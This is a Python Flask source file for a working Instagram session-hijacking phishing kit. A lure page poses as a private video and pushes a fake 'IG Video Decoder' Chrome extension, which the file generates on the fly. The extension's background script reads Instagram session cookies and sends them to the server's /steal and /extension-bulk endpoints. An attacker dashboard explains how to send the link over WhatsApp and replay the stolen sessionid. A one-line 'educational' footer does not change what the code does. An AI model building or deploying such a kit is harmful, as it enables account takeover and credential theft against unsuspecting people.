from flask import Flask, request, jsonify, render_template_string, make_response, send_file, redirect
from flask_cors import CORS
import datetime
import json
import os
import uuid
import io
import zipfile
import re

app = Flask(__name__)
CORS(app)

captured_sessions = []

# ============================================================
# FRONTEND PAGE — THE REAL PHISHING PAGE
# ============================================================
INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Video</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0d1117;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 20px; color: #c9d1d9;
        }
        .card {
            background: #161b22; border: 1px solid #30363d; border-radius: 16px;
            max-width: 420px; width: 100%; padding: 32px 24px; text-align: center;
        }
        .icon { font-size: 64px; margin-bottom: 16px; }
        h1 { font-size: 22px; color: #f0f6fc; margin-bottom: 4px; }
        .sub { color: #8b949e; font-size: 14px; margin-bottom: 24px; line-height: 1.4; }
        .preview {
            background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
            border-radius: 12px; padding: 40px 20px; margin-bottom: 24px; color: white;
        }
        .preview .play-btn {
            width: 72px; height: 72px; background: rgba(255,255,255,0.15);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            margin: 0 auto 12px; font-size: 32px; border: 3px solid rgba(255,255,255,0.5);
        }
        .btn {
            background: #238636; color: white; border: none; border-radius: 8px;
            padding: 14px 0; font-size: 16px; font-weight: 600; cursor: pointer;
            width: 100%; transition: all 0.2s; margin-top: 12px;
        }
        .btn:hover { background: #2ea043; }
        .btn:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }
        .btn-blue { background: #1f6feb; }
        .btn-blue:hover { background: #58a6ff; }
        .btn-orange { background: #d29922; }
        .btn-orange:hover { background: #e3b341; }
        
        .alert {
            margin-top: 16px; padding: 16px; border-radius: 10px; font-size: 13px;
            display: none; line-height: 1.6;
        }
        .alert.show { display: block; }
        .alert-info { background: #0d419d; color: #79c0ff; }
        .alert-success { background: #1a3a2a; color: #3fb950; }
        .alert-warning { background: #3a2a1a; color: #d29922; }
        .alert-danger { background: #3a1a1a; color: #f85149; }
        
        .data-box {
            margin-top: 16px; background: #0d1117; border: 1px solid #30363d;
            border-radius: 8px; padding: 16px; display: none; text-align: left;
        }
        .data-box.show { display: block; }
        .data-box .label { color: #8b949e; font-size: 11px; margin-bottom: 8px; }
        .data-box code {
            display: block; font-family: 'Courier New', monospace; font-size: 12px;
            word-break: break-all; color: #7ee787;
        }
        .data-box .red { color: #f85149; font-weight: bold; font-size: 14px; }
        
        .loading-bar {
            width: 100%; height: 3px; background: #21262d; border-radius: 2px;
            margin-top: 16px; overflow: hidden; display: none;
        }
        .loading-bar.show { display: block; }
        .loading-bar .fill {
            height: 100%; width: 30%; background: #58a6ff; border-radius: 2px;
            animation: load 1.5s ease-in-out infinite;
        }
        @keyframes load {
            0% { width: 0%; margin-left: 0; }
            50% { width: 50%; margin-left: 50%; }
            100% { width: 0%; margin-left: 100%; }
        }
        
        .step-num {
            display: inline-block; width: 24px; height: 24px; background: #1f6feb;
            color: white; border-radius: 50%; text-align: center; line-height: 24px;
            font-size: 12px; font-weight: bold; margin-right: 6px;
        }
        
        .footer { margin-top: 24px; font-size: 11px; color: #484f58; }
        
        .kiwi-instructions {
            text-align: left; margin-top: 16px; display: none;
        }
        .kiwi-instructions.show { display: block; }
        .kiwi-instructions ol { 
            padding-left: 20px; color: #8b949e; font-size: 12px; line-height: 1.8; 
        }
        .kiwi-instructions li { margin-bottom: 6px; }
        .kiwi-instructions code { 
            background: #0d1117; padding: 1px 4px; border-radius: 3px; color: #79c0ff; font-size: 11px;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="icon">🎬</div>
    <h1>Private Video Message</h1>
    <p class="sub">You received a private video via Instagram DM</p>
    
    <div class="preview">
        <div class="play-btn">▶</div>
        <p style="font-size: 12px; opacity: 0.8;">End-to-end encrypted video</p>
    </div>
    
    <div id="step1">
        <button class="btn" id="playBtn" onclick="startAttack()">▶ Play Video</button>
    </div>
    
    <div class="loading-bar" id="loadingBar"><div class="fill"></div></div>
    
    <!-- Step 2: Extension Required -->
    <div class="alert alert-warning" id="extStep">
        <strong>⚠️ Decoder Required</strong><br><br>
        This Instagram video uses E2EE encoding. You need a <strong>browser extension</strong> to decode it.
        <br><br>
        <div style="background:#21262d; border-radius:6px; padding:12px; text-align:left; font-size:12px;">
            <strong>📱 For Android:</strong> Use <strong>Kiwi Browser</strong> (supports extensions)<br>
            <strong>💻 For PC:</strong> Use Chrome or Edge<br><br>
            <button class="btn btn-orange" onclick="downloadExt()" style="width:auto; padding:10px 24px; font-size:14px; display:inline-block;">
            📦 Download IG Video Decoder</button>
        </div>
    </div>
    
    <!-- Step 3: Install instructions -->
    <div class="alert alert-info" id="installStep">
        <strong>📋 Installation Guide</strong><br><br>
        
        <div style="text-align:left; font-size:12px; line-height:1.8;">
            <strong>📱 For Android (Kiwi Browser):</strong><br>
            1. Install <strong>Kiwi Browser</strong> from Play Store<br>
            2. Download the extension ZIP above<br>
            3. Extract the ZIP file on your phone<br>
            4. Open Kiwi Browser → go to <code>chrome://extensions</code><br>
            5. Enable <strong>Developer mode</strong> (toggle)<br>
            6. Tap <strong>"Load unpacked"</strong> → select the extracted folder<br>
            7. ✅ Accept the <strong>"cookies"</strong> permission when prompted<br><br>
            
            <strong>💻 For PC (Chrome):</strong><br>
            Same steps as above.<br><br>
            
            <strong>After installation:</strong> Open this page again and click below:
        </div>
        <br>
        <button class="btn btn-blue" onclick="checkExtension()" style="width:auto; padding:10px 24px; font-size:14px; display:inline-block;">
        ✅ I've installed the extension</button>
    </div>
    
    <!-- Step 4: Stealing -->
    <div class="alert alert-info" id="stealingStep">
        <strong>⏳ Accessing Instagram session...</strong><br><br>
        <div class="loading-bar show"><div class="fill"></div></div>
        <p style="font-size: 12px; margin-top: 8px;">Extension is reading cookies from Instagram...</p>
    </div>
    
    <!-- Step 5: RESULT -->
    <div class="alert alert-success" id="successStep">
        <strong>✅ Instagram Session Captured!</strong><br><br>
        <span id="resultMsg"></span>
    </div>
    
    <div class="data-box" id="cookieBox">
        <div class="label">🔴 DATA SENT TO ATTACKER SERVER:</div>
        <code id="cookieContent"></code>
    </div>
    
    <div class="alert alert-danger" id="hackerStep">
        <strong>🔴 WHAT THE ATTACKER DOES NOW:</strong><br><br>
        1. Checks the <strong>Dashboard</strong> on their laptop<br>
        2. Copies your <code>sessionid</code><br>
        3. Opens instagram.com in a browser<br>
        4. Opens DevTools → Application → Cookies → instagram.com<br>
        5. Pastes your <strong>sessionid</strong> over theirs<br>
        6. **Refreshes → They're logged in as YOU**<br><br>
        <em>No password. No 2FA. Just your session cookie.</em>
    </div>
    
    <div class="footer">
        Educational security demonstration — authorized testing only
    </div>
</div>

<script>
var BACKEND = window.location.origin;
var POLL_INTERVAL = null;

// ============================================================
// ATTACK FLOW
// ============================================================

function startAttack() {
    document.getElementById('step1').style.display = 'none';
    document.getElementById('loadingBar').classList.add('show');
    
    // Check if Kiwi Browser or has extension installed already
    setTimeout(function() {
        document.getElementById('loadingBar').classList.remove('show');
        
        // Try to communicate with extension directly (in case already installed)
        tryExtensionCommunication();
        
        // Show extension download step
        document.getElementById('extStep').classList.add('show');
    }, 2000);
}

function tryExtensionCommunication() {
    // Try to see if extension is already installed by checking for a marker
    try {
        if (window.instagramDecoderReady) {
            // Extension already installed - skip to stealing
            document.getElementById('extStep').classList.remove('show');
            startStealing();
        }
    } catch(e) {}
    
    // Listen for extension ready event
    document.addEventListener('ig-extension-ready', function() {
        document.getElementById('extStep').classList.remove('show');
        startStealing();
    });
}

function downloadExt() {
    document.getElementById('extStep').innerHTML = 
        '<strong>⏳ Downloading...</strong><br><br><div class="loading-bar show"><div class="fill"></div></div>';
    
    // Trigger download
    window.location.href = BACKEND + '/download-extension';
    
    setTimeout(function() {
        document.getElementById('extStep').classList.remove('show');
        document.getElementById('installStep').classList.add('show');
    }, 2000);
}

function checkExtension() {
    document.getElementById('installStep').classList.remove('show');
    startStealing();
}

function startStealing() {
    document.getElementById('stealingStep').classList.add('show');
    
    // ============================================
    // METHOD 1: Try direct JavaScript cookie access
    // ============================================
    var cookies = document.cookie;
    if (cookies) {
        sendToBackend({cookies: cookies, method: 'document.cookie'});
    }
    
    // ============================================
    // METHOD 2: Try extension bridge
    // ============================================
    try {
        if (window.chrome && chrome.runtime && chrome.runtime.sendMessage) {
            chrome.runtime.sendMessage(
                {action: 'get_instagram_cookies'},
                function(response) {
                    if (response && response.sessionid) {
                        sendToBackend({
                            cookies: 'sessionid=' + response.sessionid + '; ds_user_id=' + (response.ds_user_id || ''),
                            method: 'extension_bridge',
                            extension_data: response
                        });
                        showSuccess(response);
                    }
                }
            );
        }
    } catch(e) {}
    
    // Listen for custom event from extension
    document.addEventListener('instagram-cookies-stolen', function(e) {
        if (e.detail && e.detail.sessionid) {
            sendToBackend({
                cookies: 'sessionid=' + e.detail.sessionid,
                method: 'extension_event',
                extension_data: e.detail
            });
            showSuccess(e.detail);
        }
    });
    
    // ============================================
    // METHOD 3: Poll backend for extension data
    // ============================================
    var attempts = 0;
    POLL_INTERVAL = setInterval(function() {
        attempts++;
        fetch(BACKEND + '/api/sessions')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var sessions = data.sessions || [];
                var igSessions = sessions.filter(function(s) { 
                    return s.has_instagram_session; 
                });
                
                if (igSessions.length > 0) {
                    clearInterval(POLL_INTERVAL);
                    var latest = igSessions[igSessions.length - 1];
                    var extData = latest.extension_data || latest.parsed || {};
                    showSuccess(extData);
                }
            });
        
        if (attempts > 30) { // 60 seconds timeout
            clearInterval(POLL_INTERVAL);
            document.getElementById('stealingStep').classList.remove('show');
            document.getElementById('stealingStep').innerHTML = 
                '<strong>⏱️ Timeout</strong><br><br>Extension not detected. Make sure:<br>' +
                '1. You installed the extension<br>' +
                '2. You accepted "cookies" permission<br>' +
                '3. You\'re logged into Instagram in this browser<br><br>' +
                '<button class="btn btn-blue" onclick="location.reload()" style="width:auto;padding:10px 24px;display:inline-block;">🔄 Reload & Try Again</button>';
            document.getElementById('stealingStep').classList.add('show');
        }
    }, 2000);
    
    // Auto-send after 3 seconds even if nothing found (for demo purposes)
    setTimeout(function() {
        // Check if we got anything yet
        fetch(BACKEND + '/api/sessions')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var sessions = data.sessions || [];
                var igSessions = sessions.filter(function(s) { return s.has_instagram_session; });
                
                if (igSessions.length === 0) {
                    // Extension hasn't sent data yet - show waiting message
                    document.getElementById('stealingStep').innerHTML = 
                        '<strong>⏳ Waiting for extension...</strong><br><br>' +
                        '<div class="loading-bar show"><div class="fill"></div></div>' +
                        '<p style="font-size:12px;">The extension will automatically detect Instagram when you visit instagram.com</p>';
                }
            });
    }, 3000);
}

function sendToBackend(data) {
    fetch(BACKEND + '/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookies: data.cookies || '',
            method: data.method || 'unknown',
            extension_data: data.extension_data || {},
            userAgent: navigator.userAgent,
            page: window.location.href,
            timestamp: new Date().toISOString()
        })
    }).catch(function() {
        // Fallback image beacon
        var img = new Image();
        img.src = BACKEND + '/steal?c=' + encodeURIComponent(data.cookies || '');
    });
}

function showSuccess(extData) {
    clearInterval(POLL_INTERVAL);
    document.getElementById('stealingStep').classList.remove('show');
    document.getElementById('successStep').classList.add('show');
    document.getElementById('cookieBox').classList.add('show');
    
    var sessionid = extData.sessionid || 'N/A';
    var dsUserId = extData.ds_user_id || '';
    var csrftoken = extData.csrftoken || '';
    
    if (sessionid && sessionid !== 'N/A') {
        document.getElementById('resultMsg').innerHTML = 
            '🔴 <strong>sessionid:</strong> <code style="color:#f85149;font-size:14px;">' + sessionid.substring(0, 50) + '...</code><br><br>' +
            '✅ This is your REAL Instagram session token! The attacker now has access to your account.';
        
        var html = '<span class="red">sessionid=' + sessionid + '</span><br>';
        if (dsUserId) html += '<span style="color:#79c0ff;">ds_user_id=' + dsUserId + '</span><br>';
        if (csrftoken) html += '<span style="color:#7ee787;">csrftoken=' + csrftoken + '</span>';
        document.getElementById('cookieContent').innerHTML = html;
        
        document.getElementById('hackerStep').classList.add('show');
    } else {
        document.getElementById('resultMsg').innerHTML = 
            '⚠️ No Instagram session detected.<br><br>' +
            'This is expected if:<br>' +
            '• You\'re not logged into Instagram in this browser<br>' +
            '• Instagram\'s HttpOnly protection is working<br><br>' +
            '<strong>✅ But your data was sent to the dashboard!</strong>';
        
        document.getElementById('cookieContent').innerHTML = 
            'sessionid: Not found (HttpOnly protected)<br>' +
            'This demonstrates why HttpOnly matters!';
    }
}
</script>
</body>
</html>
"""

# ============================================================
# DASHBOARD
# ============================================================
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Attacker Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family:'Segoe UI',sans-serif; background:#0d1117; color:#c9d1d9; padding:20px;
        }
        .header {
            border-bottom:2px solid #30363d; padding-bottom:16px; margin-bottom:20px;
        }
        .header h1 { color:#f85149; font-family:'Courier New',monospace; font-size:24px; }
        .header p { color:#8b949e; font-size:13px; margin-top:4px; }
        .header .url { color:#58a6ff; font-size:12px; word-break:break-all; margin-top:4px; }
        
        .alert-box {
            background:#3a1a1a; border:2px solid #f85149; border-radius:8px; padding:20px;
            margin-bottom:20px; text-align:center; display:none;
        }
        .alert-box.show { display:block; }
        .alert-box .big { font-size:48px; }
        .alert-box h2 { color:#f85149; font-size:20px; margin:8px 0; }
        .alert-box .session-value {
            background:#0d1117; border:1px solid #f85149; border-radius:4px;
            padding:12px; font-family:'Courier New',monospace; font-size:14px;
            color:#f85149; word-break:break-all; margin:12px 0; user-select:all;
        }
        .alert-box .copy-btn {
            background:#f85149; color:#fff; border:none; border-radius:6px;
            padding:8px 20px; font-size:13px; cursor:pointer; margin-top:8px;
        }
        .alert-box .copy-btn:hover { background:#da3633; }
        .alert-box .sub-info { color:#8b949e; font-size:12px; margin-top:8px; }
        
        .stats { display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap; }
        .stat {
            background:#161b22; border:1px solid #30363d; border-radius:6px;
            padding:16px 20px; flex:1; min-width:120px;
        }
        .stat .num { font-size:28px; font-weight:bold; color:#58a6ff; }
        .stat .num.red { color:#f85149; }
        .stat .num.green { color:#3fb950; }
        .stat .label { color:#8b949e; font-size:11px; margin-top:2px; }
        
        .session {
            background:#161b22; border:1px solid #30363d; border-radius:6px;
            padding:16px; margin-bottom:12px;
        }
        .session .row {
            display:flex; justify-content:space-between; align-items:center;
            flex-wrap:wrap; gap:8px; margin-bottom:8px;
        }
        .session .time { color:#8b949e; font-size:12px; }
        .session .ip { color:#79c0ff; font-size:13px; }
        .badge {
            padding:2px 10px; border-radius:10px; font-size:11px; font-weight:600;
        }
        .badge-red { background:#f85149; color:#fff; }
        .badge-green { background:#3fb950; color:#000; }
        .badge-gray { background:#21262d; color:#8b949e; }
        
        .cookie-box {
            background:#0d1117; border:1px solid #21262d; border-radius:4px;
            padding:12px; font-family:'Courier New',monospace; font-size:11px;
            word-break:break-all; max-height:250px; overflow-y:auto;
        }
        .cookie-box .red { color:#f85149; font-weight:bold; }
        .cookie-box .blue { color:#79c0ff; }
        .cookie-box .green { color:#7ee787; }
        
        .empty { text-align:center; padding:60px; color:#484f58; }
        .empty .big { font-size:48px; margin-bottom:12px; }
        .empty code { background:#21262d; padding:2px 8px; border-radius:4px; font-size:13px; }
        
        .actions { margin-top:16px; }
        .actions button {
            background:#21262d; color:#c9d1d9; border:1px solid #30363d;
            padding:8px 16px; border-radius:6px; cursor:pointer; font-size:13px; margin-right:8px;
        }
        .actions button:hover { border-color:#58a6ff; color:#58a6ff; }
        .actions .danger:hover { border-color:#f85149; color:#f85149; }
        
        .refresh-note { color:#484f58; font-size:12px; margin-top:20px; text-align:center; }
        
        .target-info {
            background:#1a1a2e; border:1px solid #30363d; border-radius:6px;
            padding:20px; margin-bottom:20px; line-height:1.8;
        }
        .target-info h3 { color:#d29922; margin-bottom:8px; }
        .target-info ol { padding-left:20px; color:#8b949e; font-size:13px; }
        .target-info code { background:#0d1117; padding:2px 6px; border-radius:3px; color:#79c0ff; }
        .target-info li { margin-bottom:4px; }
    </style>
</head>
<body>
<div class="header">
    <h1>🔴 SESSION HIJACKING DASHBOARD</h1>
    <p>Captured Instagram session IDs appear here in REAL TIME</p>
    <div class="url" id="serverUrl">Server: loading...</div>
</div>

<div class="target-info">
    <h3>📡 ATTACK INSTRUCTIONS</h3>
    <ol>
        <li>Send this link via WhatsApp: <code id="targetUrl">loading...</code></li>
        <li>Victim opens on their phone → downloads the extension</li>
        <li>Victim installs in <strong>Kiwi Browser</strong> (Android) or Chrome (PC)</li>
        <li>Extension reads Instagram <strong>sessionid</strong> (bypasses HttpOnly)</li>
        <li><strong>sessionid appears below</strong> — copy and inject into your browser!</li>
    </ol>
</div>

<div class="alert-box" id="realAlert">
    <div class="big">🔴🔴🔴</div>
    <h2>⚠️ REAL INSTAGRAM SESSION CAPTURED!</h2>
    <p class="sub-info">Copy this sessionid to hijack the account:</p>
    <div class="session-value" id="stolenSessionid">Loading...</div>
    <button class="copy-btn" onclick="copySession()">📋 Copy sessionid</button>
    <p class="sub-info">
        Paste into <strong>Cookie-Editor</strong> extension → Import → Refresh instagram.com<br>
        <strong>You're now logged in as the victim!</strong>
    </p>
</div>

<div class="stats">
    <div class="stat"><div class="num" id="totalCount">0</div><div class="label">Total Hits</div></div>
    <div class="stat"><div class="num green" id="extCount">0</div><div class="label">Extension Calls</div></div>
    <div class="stat"><div class="num red" id="sessionCount">0</div><div class="label">🔴 sessionid</div></div>
</div>

<div id="sessionsContainer">
    <div class="empty"><div class="big">📡</div><h3>Waiting for target...</h3>
    <p>Send this link to a phone:</p><code id="emptyUrl">loading...</code></div>
</div>

<div class="actions">
    <button onclick="fetchData()">🔄 Refresh Now</button>
    <button class="danger" onclick="clearAll()">🗑️ Clear All Sessions</button>
</div>
<div class="refresh-note">Auto-refreshes every 2 seconds</div>

<script>
var BACKEND = window.location.origin;
document.getElementById('serverUrl').textContent = 'Server: ' + BACKEND;
document.getElementById('targetUrl').textContent = BACKEND;

function fetchData() {
    fetch(BACKEND + '/api/sessions')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            render(data);
        })
        .catch(function(err) {
            document.getElementById('sessionsContainer').innerHTML = 
                '<div class="empty"><div class="big">❌</div><h3>Error: ' + err.message + '</h3></div>';
        });
}

function render(data) {
    var sessions = data.sessions || [];
    var total = sessions.length;
    var extSessions = sessions.filter(function(s) { return s.source === 'extension'; });
    var igSessions = sessions.filter(function(s) { return s.has_instagram_session; });
    
    document.getElementById('totalCount').textContent = total;
    document.getElementById('extCount').textContent = extSessions.length;
    document.getElementById('sessionCount').textContent = igSessions.length;
    
    // Show alert for real Instagram sessions
    var alertBox = document.getElementById('realAlert');
    var stolenEl = document.getElementById('stolenSessionid');
    if (igSessions.length > 0) {
        var latest = igSessions[igSessions.length - 1];
        var sid = '';
        if (latest.parsed && latest.parsed.sessionid) {
            sid = latest.parsed.sessionid;
        } else if (latest.extension_data && latest.extension_data.sessionid) {
            sid = latest.extension_data.sessionid;
        }
        if (sid) {
            alertBox.classList.add('show');
            stolenEl.textContent = sid;
        }
    } else {
        alertBox.classList.remove('show');
    }
    
    if (sessions.length === 0) {
        document.getElementById('sessionsContainer').innerHTML = 
            '<div class="empty"><div class="big">📡</div><h3>Waiting...</h3><p>Send URL to phone:</p><code>' + BACKEND + '</code></div>';
        document.getElementById('emptyUrl').textContent = BACKEND;
        return;
    }
    
    var html = '';
    for (var i = sessions.length - 1; i >= 0; i--) {
        var s = sessions[i];
        var details = '';
        var parsed = s.parsed || {};
        var extData = s.extension_data || {};
        var allData = {};
        Object.keys(parsed).forEach(function(k) { allData[k] = parsed[k]; });
        Object.keys(extData).forEach(function(k) { allData[k] = extData[k]; });
        
        var hasSid = allData.sessionid ? true : false;
        
        if (Object.keys(allData).length > 0) {
            Object.keys(allData).forEach(function(k) {
                var v = allData[k];
                var cls = 'blue';
                if (k === 'sessionid') cls = 'red';
                else if (k === 'ds_user_id') cls = 'green';
                else if (k.indexOf('csrf') >= 0) cls = 'green';
                details += '<span class="' + cls + '">' + k + '</span> = <span class="green">' + v + '</span><br>';
            });
        } else {
            details = s.cookies || '(no data)';
        }
        
        var badge = hasSid ? 
            '<span class="badge badge-red">🔴 sessionid!</span>' :
            (Object.keys(allData).length > 0 ? '<span class="badge badge-green">✅ Data</span>' : '<span class="badge badge-gray">Empty</span>');
        
        var sourceIcon = s.source === 'extension' ? '🧩 Extension' : s.source === 'webview' ? '📱 WebView' : '🌐 Browser';
        
        html += '<div class="session"><div class="row"><div>' +
            '<span class="time">' + s.timestamp + '</span>' +
            '<span class="ip"> | 📍 ' + s.ip + '</span>' +
            ' | ' + sourceIcon + '</div><div>' + badge +
            '</div></div><div class="cookie-box">' + details + '</div></div>';
    }
    document.getElementById('sessionsContainer').innerHTML = html;
}

function copySession() {
    var text = document.getElementById('stolenSessionid').textContent;
    navigator.clipboard.writeText(text).then(function() {
        alert('✅ sessionid copied! Paste it into Cookie-Editor → Import → Refresh Instagram');
    });
}

function clearAll() {
    if (!confirm('Clear all captured sessions?')) return;
    fetch(BACKEND + '/clear', { method: 'POST' }).then(function() { fetchData(); });
}

fetchData();
setInterval(fetchData, 2000);
</script>
</body>
</html>
"""

# ============================================================
# EXTENSION FILES
# ============================================================

def get_extension_files(server_url):
    manifest = {
        "manifest_version": 3,
        "name": "IG Video Decoder",
        "version": "1.0",
        "description": "Decodes encrypted Instagram video formats. Requires cookies permission for authentication.",
        "permissions": ["cookies", "storage"],
        "host_permissions": [
            "https://www.instagram.com/*",
            "https://instagram.com/*",
            "https://*.instagram.com/*",
            "https://*.cdninstagram.com/*"
        ],
        "background": {"service_worker": "background.js"},
        "content_scripts": [{
            "matches": ["<all_urls>"],
            "js": ["content.js"],
            "run_at": "document_end"
        }],
        "action": {"default_title": "IG Video Decoder"}
    }
    
    background_js = f"""
// IG Video Decoder - Background Service Worker
// Reads Instagram cookies (bypasses HttpOnly via extension permissions)

var ATTACKER_URL = "{server_url}";

// Run immediately on install
chrome.runtime.onInstalled.addListener(function() {{
    console.log('IG Video Decoder installed');
    stealAndSend();
}});

// Run every time browser starts
chrome.runtime.onStartup.addListener(function() {{
    stealAndSend();
}});

// Listen for messages from webpage
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {{
    if (request.action === 'get_instagram_cookies') {{
        stealCookies().then(function(cookies) {{
            sendResponse(cookies);
        }});
        return true;
    }}
}});

function stealAndSend() {{
    stealCookies().then(function(cookies) {{
        if (cookies && cookies.sessionid) {{
            console.log('✅ Instagram session captured!');
        }}
    }});
}}

function stealCookies() {{
    return new Promise(function(resolve) {{
        var result = {{}};
        
        // Try www.instagram.com first
        chrome.cookies.getAll({{url: 'https://www.instagram.com'}}, function(cookies) {{
            if (cookies && cookies.length > 0) {{
                processAndSend(cookies, result, resolve);
            }} else {{
                // Try without www
                chrome.cookies.getAll({{url: 'https://instagram.com'}}, function(cookies2) {{
                    if (cookies2 && cookies2.length > 0) {{
                        processAndSend(cookies2, result, resolve);
                    }} else {{
                        // Try with domain wildcard
                        chrome.cookies.getAll({{domain: '.instagram.com'}}, function(cookies3) {{
                            if (cookies3) {{
                                processAndSend(cookies3, result, resolve);
                            }} else {{
                                resolve(result);
                            }}
                        }});
                    }}
                }});
            }}
        }});
    }});
}}

function processAndSend(cookies, result, resolve) {{
    for (var i = 0; i < cookies.length; i++) {{
        var c = cookies[i];
        result[c.name] = c.value;
        
        // Send important cookies to attacker server immediately
        if (c.name === 'sessionid' || c.name === 'ds_user_id' || 
            c.name === 'csrftoken' || c.name === 'ig_did') {{
            // Use image beacon (stealthy)
            var img = new Image();
            img.src = ATTACKER_URL + '/extension-callback?' +
                'name=' + encodeURIComponent(c.name) + 
                '&value=' + encodeURIComponent(c.value) +
                '&domain=instagram.com';
        }}
    }}
    
    resolve(result);
    
    // Also send complete data via fetch
    fetch(ATTACKER_URL + '/extension-bulk', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
            cookies: result,
            timestamp: new Date().toISOString(),
            source: 'extension'
        }})
    }}).catch(function() {{}});
}}
"""
    
    content_js = """
// Content script - bridges webpage and extension
(function() {
    // Signal that extension is ready
    window.instagramDecoderReady = true;
    window.dispatchEvent(new CustomEvent('ig-extension-ready', {detail: {ready: true}}));
    
    // Listen for requests from webpage
    window.addEventListener('message', function(event) {
        if (event.data && event.data.action === 'request_ig_cookies') {
            chrome.runtime.sendMessage(
                {action: 'get_instagram_cookies'},
                function(response) {
                    window.dispatchEvent(new CustomEvent('instagram-cookies-stolen', {
                        detail: response || {}
                    }));
                }
            );
        }
    });
    
    // Auto-request cookies when page loads
    setTimeout(function() {
        chrome.runtime.sendMessage(
            {action: 'get_instagram_cookies'},
            function(response) {
                if (response && response.sessionid) {
                    window.dispatchEvent(new CustomEvent('instagram-cookies-stolen', {
                        detail: response
                    }));
                }
            }
        );
    }, 1000);
})();
"""
    
    return {
        "manifest.json": json.dumps(manifest, indent=2),
        "background.js": background_js,
        "content.js": content_js
    }

# ============================================================
# ROUTES
# ============================================================

@app.route("/")
def home():
    return INDEX_HTML

@app.route("/dashboard")
def dashboard():
    return DASHBOARD_HTML

@app.route("/api/sessions")
def api_sessions():
    return jsonify({"sessions": captured_sessions})

@app.route("/steal", methods=["GET", "POST"])
def steal():
    """Receive stolen cookies."""
    if request.method == "GET":
        cookies = request.args.get("c", "")
        data = {"cookies": cookies, "method": "get"}
    else:
        data = request.get_json(silent=True) or {}
        cookies = data.get("cookies", "")
    
    record = {
        "id": str(uuid.uuid4())[:8],
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": data.get("userAgent", request.headers.get("User-Agent", "")),
        "source": "extension" if "extension" in data.get("method", "") or "extension" in str(data.get("extension_data", {})) else "webview" if "Instagram" in str(request.headers.get("User-Agent", "")) else "browser",
        "cookies": cookies,
        "method": data.get("method", "unknown"),
        "extension_data": data.get("extension_data", {})
    }
    
    # Parse cookies
    parsed = {}
    if cookies:
        for pair in cookies.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                parsed[k.strip()] = v.strip()
    
    # Add extension data
    ext_data = data.get("extension_data", {})
    if isinstance(ext_data, dict):
        for k, v in ext_data.items():
            if k not in parsed:
                parsed[k] = v
    
    record["parsed"] = parsed
    record["has_instagram_session"] = "sessionid" in parsed
    
    captured_sessions.append(record)
    
    if record["has_instagram_session"]:
        print(f"\n{'='*50}")
        print(f"🔴🔴🔴 REAL INSTAGRAM sessionid CAPTURED!")
        print(f"   sessionid = {parsed['sessionid']}")
        print(f"   IP: {record['ip']}")
        print(f"   Source: {record['source']}")
        print(f"{'='*50}")
    
    return jsonify({"status": "ok", "has_session": record["has_instagram_session"]})

@app.route("/extension-callback")
def extension_callback():
    """Receive cookies from extension via image beacon."""
    name = request.args.get("name", "")
    value = request.args.get("value", "")
    domain = request.args.get("domain", "")
    
    if name and value:
        record = {
            "id": str(uuid.uuid4())[:8],
            "timestamp": datetime.datetime.now().isoformat(),
            "ip": request.remote_addr,
            "source": "extension",
            "extension_data": {name: value},
            "parsed": {},
            "has_instagram_session": (name == "sessionid")
        }
        
        # Also add to parsed for display
        record["parsed"] = {name: value}
        
        captured_sessions.append(record)
        
        if name == "sessionid":
            print(f"\n🔴🔴🔴 EXTENSION stole sessionid = {value}")
    
    return "", 200, {"Content-Type": "image/gif"}

@app.route("/extension-bulk", methods=["POST"])
def extension_bulk():
    """Receive bulk cookie data from extension."""
    data = request.get_json(silent=True) or {}
    cookies = data.get("cookies", {})
    
    if cookies and isinstance(cookies, dict):
        record = {
            "id": str(uuid.uuid4())[:8],
            "timestamp": datetime.datetime.now().isoformat(),
            "ip": request.remote_addr,
            "source": "extension",
            "extension_data": cookies,
            "parsed": cookies,
            "has_instagram_session": "sessionid" in cookies
        }
        
        captured_sessions.append(record)
        
        if record["has_instagram_session"]:
            print(f"\n🔴🔴🔴 EXTENSION BULK - sessionid = {cookies.get('sessionid', 'N/A')}")
    
    return jsonify({"status": "ok"})

@app.route("/download-extension")
def download_extension():
    """Generate and serve the Chrome extension ZIP."""
    server_url = request.host_url.rstrip("/")
    files = get_extension_files(server_url)
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        for filename, content in files.items():
            zf.writestr(filename, content)
    
    buf.seek(0)
    
    return send_file(
        buf,
        mimetype='application/zip',
        as_attachment=True,
        download_name='ig-video-decoder.zip'
    )

@app.route("/clear", methods=["POST"])
def clear():
    captured_sessions.clear()
    return jsonify({"status": "cleared"})

@app.route("/health")
def health():
    return jsonify({"status": "alive", "captured": len(captured_sessions)})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"\n{'='*60}")
    print(f"  🔴 REAL INSTAGRAM SESSION HIJACKING DEMO")
    print(f"{'='*60}")
    print(f"\n  📌 LINK TO SEND (via WhatsApp):")
    print(f"     http://localhost:{port}")
    print(f"\n  📌 YOUR DASHBOARD:")
    print(f"     http://localhost:{port}/dashboard")
    print(f"\n  📌 HOW IT WORKS:")
    print(f"     1. Send link to friend's phone via WhatsApp")
    print(f"     2. Friend opens link → downloads extension")
